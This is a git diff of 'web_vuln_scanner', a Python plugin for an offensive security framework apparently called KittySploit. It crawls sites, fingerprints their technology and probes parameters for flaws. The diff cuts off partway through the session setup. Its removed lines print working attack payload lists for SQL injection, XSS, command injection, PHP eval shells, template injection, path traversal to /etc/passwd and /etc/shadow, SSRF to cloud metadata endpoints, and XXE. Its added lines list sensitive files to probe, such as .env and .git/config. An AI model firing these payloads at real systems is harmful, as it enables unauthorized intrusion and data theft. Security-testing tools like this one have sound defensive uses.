@@ -3,1254 +3,1810 @@
 
 """
 Web Vulnerability Scanner Plugin for KittySploit
-Automatically crawls websites, parses URLs/parameters, and tests vulnerabilities
-using appropriate exploit modules.
+
+The plugin now uses a staged workflow:
+- crawl and normalize endpoints
+- run passive HTTP detectors already present in the framework
+- perform targeted active probes on discovered parameters
+- recommend and optionally verify follow-up modules with safer checks
 """
 
 from kittysploit import *
-import shlex
-import re
+import html
+import json
 import os
-import urllib.parse
-from urllib.parse import urlparse, urljoin, parse_qs
-from collections import defaultdict, deque
-import threading
-import queue
+import posixpath
+import re
+import shlex
 import time
-from uuid import uuid4
-import random
-import string
-from typing import Dict, List, Set, Tuple, Optional, Any
+import warnings
+from collections import defaultdict, deque
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from threading import Lock
-from itertools import chain
+from typing import Any, Dict, List, Optional, Set, Tuple
+from urllib.parse import parse_qsl, urlencode, urljoin, urlparse, urlunparse
 
 try:
     import requests
+    import urllib3
     from bs4 import BeautifulSoup
+    from bs4 import FeatureNotFound
+    from bs4 import XMLParsedAsHTMLWarning
+    from requests.adapters import HTTPAdapter
+    from urllib3.util.retry import Retry
+    from urllib3.exceptions import InsecureRequestWarning
+
     REQUESTS_AVAILABLE = True
 except ImportError:
     REQUESTS_AVAILABLE = False
+    urllib3 = None
+    FeatureNotFound = Exception
+    XMLParsedAsHTMLWarning = Warning
+    InsecureRequestWarning = Warning
 
 
-# --- Constants & Signatures ---
-
-WAF_SIGNATURES = {
-    'Cloudflare': ['cf-ray', '__cfduid', 'cloudflare'],
-    'AWS WAF': ['x-amzn-requestid', 'aws-waf'],
-    'Akamai': ['akamai', 'ak_bmsc'],
-    'F5 BIG-IP': ['bigip', 'f5_cspm'],
-    'Imperva': ['incap_ses', 'visid_incap'],
-    'Barracuda': ['barra_counter_session'],
-    'ModSecurity': ['mod_security', 'modsecurity_ids'],
-    'Sucuri': ['sucuri', 'x-sucuri'],
-    'Fortinet': ['fortigate', 'fortiwaf'],
-    'Palo Alto': ['x-pan-os-protect'],
-    'StackPath': ['x-stackpath'],
-    'Wordfence': ['wordfence'],
-    'Unknown WAF': ['waf', 'firewall', 'protect', 'blocked'] # Generic catch-all
+STATIC_EXTENSIONS = {
+    ".7z",
+    ".avi",
+    ".bmp",
+    ".css",
+    ".csv",
+    ".doc",
+    ".docx",
+    ".eot",
+    ".gif",
+    ".gz",
+    ".ico",
+    ".jpeg",
+    ".jpg",
+    ".js",
+    ".map",
+    ".mp3",
+    ".mp4",
+    ".otf",
+    ".pdf",
+    ".png",
+    ".svg",
+    ".tar",
+    ".tgz",
+    ".ttf",
+    ".wav",
+    ".webm",
+    ".webp",
+    ".woff",
+    ".woff2",
+    ".xls",
+    ".xlsx",
+    ".xml",
+    ".zip",
 }
 
-SQLI_ERROR_SIGNATURES = [
+DESTRUCTIVE_PATH_KEYWORDS = {
+    "delete",
+    "destroy",
+    "drop",
+    "logout",
+    "remove",
+    "reset",
+    "signout",
+    "truncate",
+}
+
+SKIP_PARAM_KEYWORDS = {
+    "_csrf",
+    "_token",
+    "_wpnonce",
+    "authenticity_token",
+    "captcha",
+    "csrf",
+    "nonce",
+    "token",
+}
+
+COMMON_DISCOVERY_PATHS = [
+    "robots.txt",
+    "sitemap.xml",
+    ".env",
+    ".env.local",
+    ".git/HEAD",
+    ".git/config",
+    "backup.zip",
+    "backup.sql",
+    "config.php",
+    "debug.log",
+    "phpinfo.php",
+    "server-status",
+    "swagger",
+    "swagger/index.html",
+    "swagger-ui/",
+    "actuator",
+    "graphql",
+    "api",
+    "api/v1",
+    "wp-login.php",
+    "wp-admin/",
+    "admin/",
+    "login/",
+]
+
+PASSIVE_SCANNERS = [
+    "scanner/http/admin_panel_detect",
+    "scanner/http/directory_listing_detect",
+    "scanner/http/django_debug_detect",
+    "scanner/http/docker_registry_detect",
+    "scanner/http/exposed_env_detect",
+    "scanner/http/exposed_git_detect",
+    "scanner/http/flask_debug_detect",
+    "scanner/http/grafana_detect",
+    "scanner/http/graphql_detect",
+    "scanner/http/http_methods_detect",
+    "scanner/http/jenkins_detect",
+    "scanner/http/joomla_detect",
+    "scanner/http/kibana_detect",
+    "scanner/http/marimo_websocket_rce",
+    "scanner/http/phpinfo_detect",
+    "scanner/http/phpmyadmin_detect",
+    "scanner/http/robots_txt_detect",
+    "scanner/http/security_headers_detect",
+    "scanner/http/sensitive_files_detect",
+    "scanner/http/server_banner_detect",
+    "scanner/http/swagger_detect",
+    "scanner/http/tomcat_detect",
+    "scanner/http/wordpress_detect",
+    "scanner/http/wordpress_madara_cve_2025_4524",
+]
+
+SQLI_ERRORS = [
     "you have an error in your sql syntax",
     "warning: mysql",
-    "unclosed quotation mark after the character string",
+    "mysqli_sql_exception",
+    "mysql_fetch",
+    "sql syntax",
     "quoted string not properly terminated",
-    "pg_query(): query failed",
+    "unclosed quotation mark",
     "sqlite error",
-    "mysql_fetch_array()",
-    "sqlstate",
-    "ora-01756",
-    "ora-00933",
-    "microsoft ole db provider for odbc drivers",
-    "microsoft ole db provider for sql server",
-    "odbc sql server driver",
-    "sql server driver",
+    "sqlite3.operationalerror",
+    "pg_query(",
     "postgresql query failed",
-    "warning: pg_",
-    "valid mysql result",
-    "myodbc sql server driver",
-    "sql command not properly ended",
-    "sql syntax near",
-    "mysql_num_rows()",
-    "mysql_query()",
-    "mysql_fetch_assoc()",
-    "mysql_fetch_row()",
-    "mysql_fetch_object()",
-    "supplied argument is not a valid mysql result",
-    "column count doesn't match value count",
-    "table '.*' doesn't exist",
-    "unknown column",
-    "duplicate entry",
-    "syntax error",
-    "unexpected end of sql command",
-    "integrity constraint violation",
+    "sqlstate[",
+    "ora-01756",
+    "odbc sql server driver",
+    "microsoft ole db provider for sql server",
+]
+
+LINUX_LFI_MARKERS = [
+    "root:x:0:0:",
+    "/bin/bash",
+    "/usr/sbin/nologin",
+    "daemon:x:",
 ]
 
 WINDOWS_LFI_MARKERS = [
     "[fonts]",
     "[extensions]",
-    "for 16-bit app support",
-    "[drivers]",
     "[mci extensions]",
-    "windows\\\\system32",
-    "root:x:", # For when windows can read linux files (e.g. WSL or weird setups) - unlikely but possible in CTFs
-    "default=multi(0)disk(0)rdisk(0)partition(1)",
+    "for 16-bit app support",
+    "windows\\system32",
 ]
 
-LINUX_LFI_MARKERS = [
-    "root:x:0:0:",
-    "daemon:x:",
-    "/bin/bash",
-    "/usr/sbin/nologin",
-    "PATH=",
-]
-
-# Payloads SQLi avancés
-SQLI_PAYLOADS = {
-    'error_based': [
-        "'",
-        "\"",
-        "'\"))-- -",
-        "' OR '1'='1",
-        "\" OR \"1\"=\"1",
-        "' OR '1'='1'--",
-        "' OR '1'='1'/*",
-        "') OR ('1'='1",
-        "') OR ('1'='1'--",
-        "' UNION SELECT NULL--",
-        "' UNION SELECT 1, @@version --",
-        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
-        "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
-    ],
-    'boolean_based': [
-        ("1' AND '1'='1", "1' AND '1'='2"),
-        ("1' OR '1'='1", "1' OR '1'='2"),
-        ("1' AND 1=1", "1' AND 1=2"),
-        ("1' OR 1=1", "1' OR 1=2"),
-        ("' AND 'a'='a", "' AND 'a'='b"),
-        ("1 AND 1=1", "1 AND 1=2"),
-    ],
-    'time_based': [
-        "'; WAITFOR DELAY '00:00:05'--",
-        "'; SELECT SLEEP(5)--",
-        "'; SELECT pg_sleep(5)--",
-        "'; SELECT BENCHMARK(5000000,MD5(1))--",
-        "'; (SELECT * FROM (SELECT(SLEEP(5)))a)--",
-        "1' AND SLEEP(5)#",
-        "1 OR SLEEP(5)#",
-    ],
-    'union_based': [
-        "' UNION SELECT NULL--",
-        "' UNION SELECT NULL,NULL--",
-        "' UNION SELECT NULL,NULL,NULL--",
-        "' UNION SELECT 1,2,3--",
-        "' UNION SELECT user(),database(),version()--",
-        "' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL--",
-    ],
+WAF_SIGNATURES = {
+    "Cloudflare": ["cf-ray", "__cfduid", "cloudflare"],
+    "AWS WAF": ["x-amzn-requestid", "aws-waf"],
+    "Akamai": ["akamai", "ak_bmsc"],
+    "F5 BIG-IP": ["bigip", "f5_cspm"],
+    "Imperva": ["incap_ses", "visid_incap"],
+    "ModSecurity": ["mod_security", "modsecurity"],
+    "Sucuri": ["x-sucuri", "sucuri"],
+    "Fortinet": ["fortigate", "fortiwaf"],
+    "Wordfence": ["wordfence"],
 }
 
-# Payloads XSS avancés
-XSS_PAYLOADS = [
-    "<svg/onload=alert('XSS')>",
-    "<img src=x onerror=alert('XSS')>",
-    "<script>alert('XSS')</script>",
-    "<iframe src=javascript:alert('XSS')>",
-    "<body onload=alert('XSS')>",
-    "<input onfocus=alert('XSS') autofocus>",
-    "<select onfocus=alert('XSS') autofocus>",
-    "<textarea onfocus=alert('XSS') autofocus>",
-    "<keygen onfocus=alert('XSS') autofocus>",
-    "<video><source onerror=alert('XSS')>",
-    "<audio src=x onerror=alert('XSS')>",
-    "<details open ontoggle=alert('XSS')>",
-    "<marquee onstart=alert('XSS')>",
-    "<svg><animatetransform onbegin=alert('XSS')>",
-    "javascript:alert('XSS')",
-    "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
-    "<svg><script>alert('XSS')</script>",
-    "<iframe srcdoc='<script>alert(\"XSS\")</script>'>",
-    "<math><mi//xlink:href=\"data:x,<script>alert('XSS')</script>\">",
-    "<link rel=stylesheet href=data:,*%7bx:expression(alert('XSS'))%7d",
-    "\"><script>alert('XSS')</script>",
-    "'><script>alert('XSS')</script>",
-]
-
-# Payloads RCE avancés par langage
-RCE_PAYLOADS = {
-    'generic': [
-        "; id",
-        "| id",
-        "`id`",
-        "$(id)",
-        "&& id",
-        "|| id",
-        "& id",
-        "; echo KSP_RCE_TEST",
-        "| echo KSP_RCE_TEST",
-        "`echo KSP_RCE_TEST`",
-        "$(echo KSP_RCE_TEST)",
-        "&& echo KSP_RCE_TEST",
-        "|| echo KSP_RCE_TEST",
-    ],
-    'php': [
-        "<?php system('id'); ?>",
-        "<?php exec('id'); ?>",
-        "<?php shell_exec('id'); ?>",
-        "<?php passthru('id'); ?>",
-        "<?php echo shell_exec('id'); ?>",
-        "<?= system('id'); ?>",
-        "<?php eval($_GET['cmd']); ?>",
-        "data://text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpDTs/Pg==", # <?php system("id");?>
-    ],
-    'python': [
-        "__import__('os').system('id')",
-        "eval('__import__(\"os\").system(\"id\")')",
-        "exec('__import__(\"os\").system(\"id\")')",
-        "compile('__import__(\"os\").system(\"id\")', '<string>', 'exec')",
-        "[x for x in [__import__('os').system('id')]]",
-        "{{''.__class__.__mro__[1].__subclasses__()[401]('id',shell=True,stdout=-1).communicate()[0].strip()}}", # SSTI common
-    ],
-    'nodejs': [
-        "require('child_process').exec('id')",
-        "global.process.mainModule.require('child_process').execSync('id')",
-        "child_process.exec('id')",
-        "eval('require(\"child_process\").exec(\"id\")')",
-    ],
-    'java': [
-        "Runtime.getRuntime().exec('id')",
-        "ProcessBuilder('id').start()",
-        "new ProcessBuilder('id').start()",
-        "${T(java.lang.Runtime).getRuntime().exec('id')}", # SPEL
-    ],
+TECH_BODY_SIGNATURES = {
+    "wordpress": ["wp-content", "wp-includes", "wp-json", "wp-login.php"],
+    "drupal": ["drupal.js", "sites/all", "drupalsettings"],
+    "joomla": ["option=com_", "/media/system/js/", "joomla!"],
+    "laravel": ["laravel_session", "x-csrf-token"],
+    "django": ["csrftoken", "__admin__", "django"],
+    "flask": ["werkzeug", "flask", "__wzd"],
+    "fastapi": ["fastapi", "openapi.json", "swagger ui"],
+    "react": ["__react", "react-root"],
+    "vue": ["data-v-", "__vue__"],
+    "angular": ["ng-version", "angular"],
+    "phpmyadmin": ["phpmyadmin", "pma_"],
+    "swagger": ["swagger-ui", "openapi"],
+    "graphql": ["graphql", "__schema"],
+    "grafana": ["grafana"],
+    "kibana": ["kibana"],
+    "tomcat": ["apache tomcat", "jsessionid"],
 }
 
-# Payloads LFI avancés
-LFI_PAYLOADS = [
-    "../../../../etc/passwd",
-    "..\\..\\..\\..\\windows\\win.ini",
-    "....//....//....//etc/passwd",
-    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
-    "..%252F..%252F..%252F..%252Fetc%252Fpasswd",
-    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
-    "..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
-    "../../../../etc/passwd%00",
-    "../../../../etc/passwd\x00",
-    "....//....//....//windows/win.ini",
-    "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
-    "/etc/passwd",
-    "C:\\windows\\win.ini",
-    "/proc/self/environ",
-    "/proc/version",
-    "/etc/shadow",
-    "/etc/hosts",
-    "C:\\boot.ini",
-    "php://filter/convert.base64-encode/resource=index.php",
-    "php://filter/convert.base64-encode/resource=config.php",
-]
+ACTIVE_PARAM_HINTS = {
+    "sqli": {"account", "category", "id", "item", "num", "order", "page", "query", "search", "sort", "user"},
+    "xss": {"comment", "content", "description", "html", "message", "name", "q", "query", "search", "text", "title"},
+    "lfi": {"doc", "document", "file", "folder", "include", "page", "path", "template", "view"},
+    "ssrf": {"callback", "dest", "feed", "host", "image", "next", "redirect", "return", "site", "uri", "url"},
+    "rce": {"arg", "cmd", "command", "daemon", "dir", "exec", "ping", "process", "shell"},
+    "xxe": {"data", "payload", "soap", "xml"},
+}
 
-# Payloads SSRF
-SSRF_PAYLOADS = [
-    "http://127.0.0.1",
-    "http://localhost",
-    "http://0.0.0.0",
-    "http://[::1]",
-    "file:///etc/passwd",
-    "file:///C:/windows/win.ini",
-    "gopher://127.0.0.1:80",
-    "dict://127.0.0.1:80",
-    "http://169.254.169.254/latest/meta-data/",
-    "http://metadata.google.internal/computeMetadata/v1/",
-    "http://127.0.0.1:22",
-    "http://127.0.0.1:8080",
-]
-
-# Payloads XXE
-XXE_PAYLOADS = [
-    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
-    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80">]><foo>&xxe;</foo>',
-    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/windows/win.ini">]><foo>&xxe;</foo>',
-]
+SEVERITY_ORDER = {
+    "critical": 5,
+    "high": 4,
+    "medium": 3,
+    "low": 2,
+    "info": 1,
+}
 
 
 class WebVulnScannerPlugin(Plugin):
-    """Web Vulnerability Scanner Plugin"""
-    
+    """Web vulnerability scanner plugin."""
+
     __info__ = {
         "name": "web_vuln_scanner",
-        "description": "Automated web vulnerability scanner with crawling and smart module selection",
-        "version": "1.1.1",
+        "description": "Crawl, fingerprint and actively probe web targets with passive detectors and targeted payloads",
+        "version": "2.0.0",
         "author": "KittySploit Team",
-        "dependencies": ["requests", "beautifulsoup4"]
+        "dependencies": ["requests", "beautifulsoup4"],
     }
-    
+
     def __init__(self, framework=None):
         super().__init__(framework)
-        self.crawled_urls: Set[str] = set()
-        self.url_queue = queue.Queue()
-        self.results = []
-        self.technologies = defaultdict(list)
+        self.session = None
+        self.timeout = 10
+        self.crawl_delay = 0.2
+        self.verbose = False
         self.aggressive = False
         self.min_confidence = 70
         self.max_modules = 3
-        self.stop_flag = threading.Event()
+        self.max_urls = 150
+        self.target_url = ""
+        self.base_url = ""
+        self.target_parts = None
+        self.waf_detected = None
+        self.crawled_urls: Set[str] = set()
         self.page_cache: Dict[str, Dict[str, Any]] = {}
+        self.soup_cache: Dict[str, Any] = {}
         self.cache_lock = Lock()
         self.results_lock = Lock()
-        self.crawl_delay = 0.2
-        self.html_cache: Dict[str, Any] = {}
-        self.max_cache_size = 1000
-        self.waf_detected = None
-        self.session = None
-        
+        self.results: List[Dict[str, Any]] = []
+        self.result_keys: Set[Tuple[Any, ...]] = set()
+        self.technologies = defaultdict(set)
+        self.tech_tokens: Set[str] = set()
+        self.linked_modules: Set[str] = set()
+        self.executed_modules: Set[str] = set()
+        self.passive_scanner_paths: Set[str] = set()
+        self.endpoint_inventory: List[Dict[str, Any]] = []
+        self.followup_candidates: List[Dict[str, Any]] = []
+        self.scan_started_at = 0.0
+
     def check_dependencies(self):
-        """Check if all dependencies are available"""
         if not REQUESTS_AVAILABLE:
             print_error("Missing dependencies: requests, beautifulsoup4")
             print_info("Install with: pip install requests beautifulsoup4")
             return False
         return True
-    
+
     def run(self, *args, **kwargs):
-        """Main plugin execution"""
         parser = ModuleArgumentParser(description="Web Vulnerability Scanner", prog="web_vuln_scanner")
-        parser.add_argument("-u", "--url", dest="url", help="Target URL to scan", metavar="<url>", type=str, required=True)
+        parser.add_argument("-u", "--url", dest="url", help="Target URL to scan", metavar="<url>", type=str)
         parser.add_argument("-d", "--depth", dest="depth", help="Crawling depth (default: 2)", metavar="<depth>", type=int, default=2)
-        parser.add_argument("-t", "--threads", dest="threads", help="Number of threads (default: 5)", metavar="<threads>", type=int, default=5)
-        parser.add_argument("-m", "--modules", dest="modules", help="Comma-separated list of module patterns (default: all)", metavar="<modules>", type=str, default="all")
-        parser.add_argument("--no-crawl", dest="no_crawl", help="Disable crawling, only test provided URL", action="store_true")
+        parser.add_argument("-t", "--threads", dest="threads", help="Worker threads (default: 6)", metavar="<threads>", type=int, default=6)
+        parser.add_argument("-m", "--modules", dest="modules", help="Comma-separated follow-up module patterns (default: all)", metavar="<modules>", type=str, default="all")
+        parser.add_argument("--no-crawl", dest="no_crawl", help="Disable crawling and only scan the provided URL", action="store_true")
         parser.add_argument("--timeout", dest="timeout", help="Request timeout in seconds (default: 10)", metavar="<timeout>", type=int, default=10)
         parser.add_argument("--crawl-delay", dest="crawl_delay", help="Delay between crawl requests (default: 0.2)", metavar="<seconds>", type=float, default=0.2)
         parser.add_argument("--user-agent", dest="user_agent", help="Custom User-Agent string", metavar="<ua>", type=str, default="Mozilla/5.0 (KittySploit Scanner)")
         parser.add_argument("--cookie", dest="cookie", help="Cookie string for authenticated requests", metavar="<cookie>", type=str, default="")
-        parser.add_argument("--min-confidence", dest="min_confidence", help="Minimum confidence (0-100) (default: 70)", metavar="<confidence>", type=int, default=70)
-        parser.add_argument("--max-modules", dest="max_modules", help="Max modules per URL (default: 3)", metavar="<count>", type=int, default=3)
-        parser.add_argument("--aggressive", dest="aggressive", help="Attempt exploitation even with low confidence", action="store_true")
+        parser.add_argument("--min-confidence", dest="min_confidence", help="Minimum confidence 0-100 (default: 70)", metavar="<confidence>", type=int, default=70)
+        parser.add_argument("--max-modules", dest="max_modules", help="Maximum follow-up modules to verify (default: 3)", metavar="<count>", type=int, default=3)
+        parser.add_argument("--max-urls", dest="max_urls", help="Maximum URLs/endpoints to keep (default: 150)", metavar="<count>", type=int, default=150)
+        parser.add_argument("--report-json", dest="report_json", help="Write a JSON report to the given path", metavar="<file>", type=str, default="")
+        parser.add_argument("--passive-only", dest="passive_only", help="Run only crawl, passive detectors and follow-up recommendations", action="store_true")
+        parser.add_argument("--aggressive", dest="aggressive", help="Enable deeper probes and follow-up checks", action="store_true")
         parser.add_argument("-v", "--verbose", dest="verbose", help="Verbose output", action="store_true")
-        
+
         if not args or not args[0]:
             parser.print_help()
             return True
-        
+
         try:
             pargs = parser.parse_args(shlex.split(args[0]))
-            
-            if getattr(pargs, 'help', False):
+            if getattr(pargs, "help", False):
                 parser.print_help()
                 return True
-            
+
             if not self.check_dependencies():
                 return False
-            
-            # Start scanning
+
+            if not getattr(pargs, "url", None):
+                print_error("Target URL is required")
+                parser.print_help()
+                return False
+
             return self._scan_website(
                 url=pargs.url,
-                depth=pargs.depth,
-                threads=pargs.threads,
-                module_patterns=pargs.modules.split(',') if pargs.modules != 'all' else ['all'],
+                depth=max(0, pargs.depth),
+                threads=max(1, pargs.threads),
+                module_patterns=pargs.modules.split(",") if pargs.modules and pargs.modules != "all" else ["all"],
                 no_crawl=pargs.no_crawl,
-                timeout=pargs.timeout,
-                crawl_delay=pargs.crawl_delay,
+                timeout=max(1, pargs.timeout),
+                crawl_delay=max(0.0, pargs.crawl_delay),
                 user_agent=pargs.user_agent,
                 cookie=pargs.cookie,
                 verbose=pargs.verbose,
                 min_confidence=pargs.min_confidence,
                 max_modules=pargs.max_modules,
-                aggressive=pargs.aggressive
+                max_urls=pargs.max_urls,
+                report_json=pargs.report_json,
+                passive_only=pargs.passive_only,
+                aggressive=pargs.aggressive,
             )
-            
-        except Exception as e:
-            print_error(f"An error occurred: {e}")
-            import traceback
-            if 'pargs' in locals() and pargs.verbose:
+        except Exception as exc:
+            print_error(f"An error occurred: {exc}")
+            if "pargs" in locals() and getattr(pargs, "verbose", False):
+                import traceback
+
                 traceback.print_exc()
             return False
-    
-    def _scan_website(self, url: str, depth: int = 2, threads: int = 5, 
-                      module_patterns: List[str] = ['all'], no_crawl: bool = False,
-                      timeout: int = 10, crawl_delay: float = 0.2, user_agent: str = "", cookie: str = "",
-                      verbose: bool = False, min_confidence: int = 70,
-                      max_modules: int = 3, aggressive: bool = False) -> bool:
-        """Main scanning function"""
+
+    def _scan_website(
+        self,
+        url: str,
+        depth: int,
+        threads: int,
+        module_patterns: List[str],
+        no_crawl: bool,
+        timeout: int,
+        crawl_delay: float,
+        user_agent: str,
+        cookie: str,
+        verbose: bool,
+        min_confidence: int,
+        max_modules: int,
+        max_urls: int,
+        report_json: str,
+        passive_only: bool,
+        aggressive: bool,
+    ) -> bool:
         try:
-            # Silence SSL warnings
-            try:
-                import urllib3
-                urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-            except:
-                pass
+            self._reset_state()
+            self.target_url, self.base_url = self._normalize_target(url)
+            self.target_parts = urlparse(self.target_url)
+            self.timeout = timeout
+            self.crawl_delay = crawl_delay
+            self.verbose = verbose
+            self.aggressive = aggressive
+            self.min_confidence = max(0, min(100, int(min_confidence)))
+            self.max_modules = max(1, int(max_modules))
+            self.max_urls = max(10, int(max_urls))
+            self.threads = max(1, int(threads))
+            self.scan_started_at = time.time()
+
+            self._init_session(user_agent, cookie)
 
             print_success("Starting Web Vulnerability Scanner")
-            print_info(f"Target: {url}")
-            print_info(f"Depth: {depth} | Threads: {threads}")
-            print_info(f"Modules: {module_patterns} | Min Conf: {min_confidence}%")
-            
+            print_info(f"Target: {self.target_url}")
+            print_info(f"Depth: {depth} | Threads: {self.threads} | Max URLs: {self.max_urls}")
+            print_info(f"Min confidence: {self.min_confidence}% | Follow-up modules: {self.max_modules}")
+            if passive_only:
+                print_info("Mode: passive-only")
             if aggressive:
-                print_warning("Aggressive mode enabled - EXTREME CAUTION ADVISED.")
-            
-            # Normalize URL
-            if not url.startswith(('http://', 'https://')):
-                url = 'http://' + url
-            
-            parsed_url = urlparse(url)
-            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
-            
-            # Initialize session
-            self._init_session(user_agent, cookie, timeout, crawl_delay)
-            self.verbose = verbose
-            self.base_url = base_url
-            self.results = []
-            self.crawled_urls = set()
-            self.page_cache = {}
-            self.html_cache = {}
-            self.technologies = defaultdict(list)
-            self.tech_tokens = set()
-            self.min_confidence = max(0, min(100, min_confidence))
-            self.max_modules = max(1, max_modules)
-            self.aggressive = aggressive
-            self.waf_detected = None
-            self.threads = max(1, threads)
-            
-            # Step 0: WAF Detection
-            print_status("Step 0: Detecting WAF protection...")
-            self._detect_waf(url)
-            if self.waf_detected:
-                print_warning(f"WAF Detected: {self.waf_detected}")
-                if not aggressive:
-                    print_info("Adjusting scan verification requests to mitigate blocking.")
-                    self.crawl_delay += 0.5
-            else:
-                print_success("No WAF detected (or transparent).")
+                print_warning("Aggressive mode enabled: command injection and heavier timing probes may run.")
 
-            # Step 1: Crawl website
-            if not no_crawl:
-                print_status("Step 1: Crawling website...")
-                self._crawl_website(url, depth)
-                # Discovery fallback
-                print_status("Step 1b: Running discovery for common sensitive files...")
-                self._discover_common_files()
+            print_status("Step 0: Detecting WAF or blocking middleware...")
+            self._detect_waf(self.target_url)
+            if self.waf_detected:
+                print_warning(f"WAF detected: {self.waf_detected}")
+                if not self.aggressive:
+                    self.crawl_delay = max(self.crawl_delay, 0.5)
             else:
-                print_status("Step 1: Skipping crawl (--no-crawl)")
-                self.crawled_urls.add(url)
-            
-            print_success(f"Found {len(self.crawled_urls)} URLs to test")
-            
-            # Step 2: Analyze URLs and extract parameters
-            print_status("Step 2: Analyzing URLs and extracting parameters...")
-            url_data = self._analyze_urls()
-            
-            total_with_params = sum(1 for u in url_data if u.get('has_params', False))
-            print_success(f"Found {len(url_data)} unique endpoints ({total_with_params} with parameters)")
-            
-            # Step 3: Detect technologies
+                print_success("No obvious WAF signature detected")
+
+            print_status("Step 1: Building target inventory...")
+            if no_crawl:
+                self.crawled_urls.add(self.target_url)
+                self._verbose(f"Seeded only the provided URL: {self.target_url}")
+            else:
+                self._crawl_website(self.target_url, depth)
+            self._discover_common_files()
+            self._discover_robots_paths()
+            print_success(f"Collected {len(self.crawled_urls)} URLs after crawl and discovery")
+
+            print_status("Step 2: Building endpoint inventory...")
+            self.endpoint_inventory = self._build_endpoint_inventory()
+            params_count = sum(1 for entry in self.endpoint_inventory if entry.get("has_params"))
+            print_success(
+                f"Inventory contains {len(self.endpoint_inventory)} endpoints ({params_count} with parameters/forms)"
+            )
+
             print_status("Step 3: Detecting technologies...")
             self._detect_technologies()
-            
-            if self.technologies:
-                print_success("Detected stack components:")
-                for tech, urls in self.technologies.items():
-                    print_info(f"  - {tech}: {len(urls)} URLs")
-            
-            # Step 4: Active exploitation attempts
-            urls_with_params = [u for u in url_data if u.get('has_params', False)]
-            if urls_with_params:
-                print_status("Step 4: Actively verifying high-risk parameters...")
-                active_hits = self._active_exploit(urls_with_params)
-                print_success(f"Completed active exploitation. Confirmed {active_hits} vectors.")
+            if self.tech_tokens:
+                detected = ", ".join(sorted(self.tech_tokens))
+                print_success(f"Detected stack hints: {detected}")
             else:
-                print_status("Step 4: Skipping active exploitation (no parameters found)")
-            
-            # Step 5: Find appropriate modules
-            print_status("Step 5: Finding appropriate exploit modules...")
-            modules = self._find_modules(module_patterns, url_data)
-            
-            if not modules:
-                print_warning("No specific exploit modules matched the detected stack.")
-                print_info("Consider running generic scanner modules manually.")
+                print_warning("No strong technology fingerprint detected")
+
+            print_status("Step 4: Running passive HTTP detectors...")
+            passive_hits = self._run_passive_scanners()
+            print_success(f"Passive detectors produced {passive_hits} positive matches")
+
+            active_hits = 0
+            if passive_only:
+                print_status("Step 5: Skipping active probes (--passive-only)")
             else:
-                print_success(f"Found {len(modules)} potential exploit modules")
-                top_modules = modules[:10]
-                for mod in top_modules:
-                    path = mod['path']
-                    score = mod['score']
-                    print_info(f"  - {path} (match score: {score})")
-            
-            # Step 6: Test vulnerabilities
-            if modules:
-                print_status("Step 6: Testing vulnerabilities (Module Phase)...")
-                self._test_vulnerabilities(url_data, modules, threads)
+                print_status("Step 5: Running targeted active probes...")
+                active_hits = self._run_active_scans()
+                print_success(f"Active probes recorded {active_hits} findings")
+
+            print_status("Step 6: Selecting follow-up modules...")
+            self.followup_candidates = self._select_followup_modules(module_patterns)
+            if self.followup_candidates:
+                print_success(
+                    f"Prepared {len(self.followup_candidates)} follow-up candidates; verifying top {self.max_modules}"
+                )
+                self._run_followup_checks(self.followup_candidates[: self.max_modules])
             else:
-                print_status("Step 6: Skipping module testing.")
-            
-            # Step 7: Display results
+                print_warning("No relevant follow-up module identified")
+
             print_status("Step 7: Results Summary")
             self._display_results()
-            
+
+            if report_json:
+                self._write_json_report(report_json)
+                print_success(f"JSON report written to {report_json}")
+
             return True
-            
-        except Exception as e:
-            print_error(f"Scanning error: {e}")
-            import traceback
-            if verbose:
+        except Exception as exc:
+            print_error(f"Scanning error: {exc}")
+            if self.verbose:
+                import traceback
+
                 traceback.print_exc()
             return False
 
-    def _init_session(self, user_agent, cookie, timeout, crawl_delay):
-        """Initialize requests session with retry logic and pooling"""
-        adapter = requests.adapters.HTTPAdapter(
-            pool_connections=20,
-            pool_maxsize=50,
-            max_retries=requests.adapters.Retry(total=3, backoff_factor=0.5)
-        )
+    def _reset_state(self):
+        self.waf_detected = None
+        self.crawled_urls = set()
+        self.page_cache = {}
+        self.soup_cache = {}
+        self.results = []
+        self.result_keys = set()
+        self.technologies = defaultdict(set)
+        self.tech_tokens = set()
+        self.linked_modules = set()
+        self.executed_modules = set()
+        self.passive_scanner_paths = set()
+        self.endpoint_inventory = []
+        self.followup_candidates = []
+
+    def _init_session(self, user_agent: str, cookie: str):
+        if urllib3 is not None:
+            urllib3.disable_warnings(InsecureRequestWarning)
+
+        retry = Retry(total=2, backoff_factor=0.4, status_forcelist=[429, 500, 502, 503, 504])
+        adapter = HTTPAdapter(pool_connections=16, pool_maxsize=32, max_retries=retry)
         self.session = requests.Session()
-        self.session.mount('http://', adapter)
-        self.session.mount('https://', adapter)
-        self.session.verify = False # Disable SSL verification for speed/internal targets
-        self.session.headers.update({
-            'User-Agent': user_agent,
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.5',
-            'Accept-Encoding': 'gzip, deflate',
-            'Connection': 'keep-alive',
-            'Upgrade-Insecure-Requests': '1'
-        })
+        self.session.mount("http://", adapter)
+        self.session.mount("https://", adapter)
+        self.session.verify = False
+        self.session.headers.update(
+            {
+                "User-Agent": user_agent,
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
